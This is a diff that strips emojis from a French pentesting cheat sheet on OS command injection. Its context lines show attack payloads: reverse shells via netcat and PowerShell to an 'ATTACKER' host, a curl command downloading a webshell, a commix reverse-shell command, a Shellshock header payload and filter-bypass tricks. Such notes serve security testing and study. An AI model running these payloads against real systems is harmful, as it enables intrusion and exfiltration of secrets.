@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 🐚 Injection de commandes
+# Injection de commandes
 
 > [!info] **En 1 phrase**
 > Injection de commandes = injecter des **commandes OS arbitraires** dans une entrée utilisateur
@@ -23,7 +23,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -35,16 +35,16 @@ flowchart LR
     D --> G[Reverse shell<br>nc / bash]
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > L'app construit une commande **par concaténation** de données non fiables puis l'envoie à un
 > shell. Les **métacaractères du shell** (`;`, `|`, `&&`, backticks, `$(...)`, newline) permettent
 > de "sortir" du contexte prévu et de **chaîner nos propres commandes**.
 
 ---
 
-## 🕵️ Détection du point d'injection
+## Détection du point d'injection
 
-> [!tip] 💡 **Ordre des tests** : d'abord les payloads **visibles** (sortie affichée), puis les
+> [!tip] **Ordre des tests** : d'abord les payloads **visibles** (sortie affichée), puis les
 > **erreurs / délais** (blind), enfin le **DNS/HTTP** (out-of-band). Toujours tester en URL-encode.
 
 ### Tests Linux
@@ -95,7 +95,7 @@ Invoke-Expression "whoami"
 
 ---
 
-## 🔗 Séparateurs de commandes
+## Séparateurs de commandes
 
 ### Linux / Unix (bash, sh, zsh, dash...)
 
@@ -155,7 +155,7 @@ command1$(command2)
 
 ---
 
-## ⚙️ Injection selon le contexte
+## Injection selon le contexte
 
 ### 1. Dans un argument de commande (contexte le plus courant)
 
@@ -223,13 +223,13 @@ curl http://[ATTACKER]/ -o webshell.php
 # wget.exe --use-askpass=calc ＂
 ```
 
-> [!warning] ⚠️ **Worstfit (Windows ANSI)** : certains binaires Windows convertissent l'ANSI vers
+> [!warning] **Worstfit (Windows ANSI)** : certains binaires Windows convertissent l'ANSI vers
 > l'Unicode avec des **transformations silencieuses** (ex : guillemets fullwidth `＂` → `"`).
 > Un payload "inoffensif" peut devenir une vraie injection d'argument. Voir le blog d'Orange Tsai.
 
 ---
 
-## 🚫 Bypass de filtres
+## Bypass de filtres
 
 ### Sans espace
 
@@ -422,9 +422,9 @@ vi /etc/passwd < <(echo)
 
 ---
 
-## 📡 Exfiltration de données
+## Exfiltration de données
 
-> [!warning] ⚠️ **Quand la sortie est invisible** (blind) → on exfiltre par un canal de sortie :
+> [!warning] **Quand la sortie est invisible** (blind) → on exfiltre par un canal de sortie :
 > timing, DNS, HTTP. Le serveur doit être capable d'**atteindre l'attaquant** (egress).
 
 ### Time-based (char par char)
@@ -478,9 +478,9 @@ Outils OOB : [dnsbin.zhack.ca](https://dnsbin.zhack.ca), [interactsh](https://ap
 
 ---
 
-## 🐚 RCE complète : reverse & bind shells
+## RCE complète : reverse & bind shells
 
-> [!tip] 💡 **Cheatsheet complète** → [[Reverse Shells|🐚 Reverse Shells]]. Voici les raccourcis.
+> [!tip] **Cheatsheet complète** → [[Reverse Shells| Reverse Shells]]. Voici les raccourcis.
 
 ```bash
 # Netcat (avec -e) — encore présent sur beaucoup d'images
@@ -512,7 +512,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER'
 
 ---
 
-## 🪟 Windows : cmd.exe & PowerShell
+## Windows : cmd.exe & PowerShell
 
 ### cmd.exe
 
@@ -547,12 +547,12 @@ cmd /c powershell -c whoami
 ; Start-Sleep -Seconds 5
 ```
 
-> [!warning] ⚠️ Windows : `;` ne sépare **pas** les commandes dans cmd.exe (utiliser `&`),
+> [!warning] Windows : `;` ne sépare **pas** les commandes dans cmd.exe (utiliser `&`),
 > mais `;` **fonctionne** dans PowerShell. Toujours tester les deux.
 
 ---
 
-## 🙈 Blind command injection
+## Blind command injection
 
 > Quand on ne voit **aucune sortie** ni erreur → oracles : **temps**, **DNS**, **HTTP**.
 
@@ -579,7 +579,7 @@ $(sleep 5)
 
 ---
 
-## 🛠️ Outils
+## Outils
 
 | Outil | Usage |
 |---|---|
@@ -597,7 +597,7 @@ commix -u "http://TARGET/" --data="ip=8.8.8.8" --reverse-shell=ATTACKER:4444
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -613,23 +613,23 @@ commix -u "http://TARGET/" --data="ip=8.8.8.8" --reverse-shell=ATTACKER:4444
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **L'ordre d'exploitation**
+> [!tip] **L'ordre d'exploitation**
 > 1. **Détecter** : `;`, `|`, `||`, `&&`, backtick, `$(...)`, `%0a` — sur chaque paramètre GET/POST/header/cookie.
 > 2. **Confirmer le contexte** : argument, string entre quotes, backtick, sous-shell.
 > 3. **Sortie visible ?** oui → `; id`, lire les fichiers. non → **blind** : timing, DNS, HTTP.
 > 4. **Bypass les filtres** au fur et à mesure (espaces → `${IFS}`/tab, slash → `${HOME:0:1}`, mots-clés → quotes/hex/base64/wildcards).
 > 5. **Escalader** : reverse shell, pivot, exfiltrer les secrets.
 
-> [!warning] ⚠️ **Injection dans un paramètre vs une variable d'environnement**
+> [!warning] **Injection dans un paramètre vs une variable d'environnement**
 > Dans un **paramètre** (`system("ping ".$ip)`), les séparateurs sortent de la commande → facile.
 > Dans une **variable d'environnement** (`env -i` / `System.getenv()` réinjecté dans un shell),
 > l'expansion `$(...)` et les backticks sont évalués **au moment de l'expansion du shell**, mais
 > les caractères sont souvent déjà assainis par la couche au-dessus → tester d'abord les
 > substitutions (`${IFS}`, `$@`, `$()`) avant les séparateurs.
 
-> [!warning] ⚠️ **Pièges classiques**
+> [!warning] **Pièges classiques**
 > - `escapeshellarg()` ne protège pas contre l'**argument injection** (voir section contexte).
 > - `;` ne fonctionne pas sous cmd.exe → penser à `&`, `&&`, `|`, `%0a`.
 > - **Shellshock** (CVE-2014-6271) : une env var dans une requête HTTP (`User-Agent: () { :;}; /bin/bash -c 'id'`) exécute du code à l'arrivée dans bash → toujours tester les headers avec des payloads `() { :;};`.
@@ -638,7 +638,7 @@ commix -u "http://TARGET/" --data="ip=8.8.8.8" --reverse-shell=ATTACKER:4444
 > - Le **retour à la ligne** (`%0a`) est souvent oublié par les WAF → un test précieux.
 > - Payload polyglot qui marche dans plusieurs contextes de quotes : `1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}`.
 
-> [!tip] 💡 **Trucs utiles**
+> [!tip] **Trucs utiles**
 > - Nettoyer les arguments après l'injection avec `--` (`cmd -- ; whoami`) quand on veut ignorer le reste de la ligne.
 > - Longue commande tuée par timeout → `nohup cmd > /dev/null &`.
 > - Vérifier l'**egress** : même avec RCE, sans sortie réseau → exfil par **timing** ou écriture dans un fichier web.
@@ -646,13 +646,13 @@ commix -u "http://TARGET/" --data="ip=8.8.8.8" --reverse-shell=ATTACKER:4444
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[Injection SQL|💾 SQLi]]
-- [[XSS (Cross-Site Scripting)|🖼️ XSS]]
-- [[LFI et RFI|📂 LFI / RFI]]
-- [[SSRF|🌐 SSRF]]
-- [[Reverse Shells|🐚 Reverse Shells]]
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
+- [[Injection SQL| SQLi]]
+- [[XSS (Cross-Site Scripting)| XSS]]
+- [[LFI et RFI| LFI / RFI]]
+- [[SSRF| SSRF]]
+- [[Reverse Shells| Reverse Shells]]
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
 
 ---
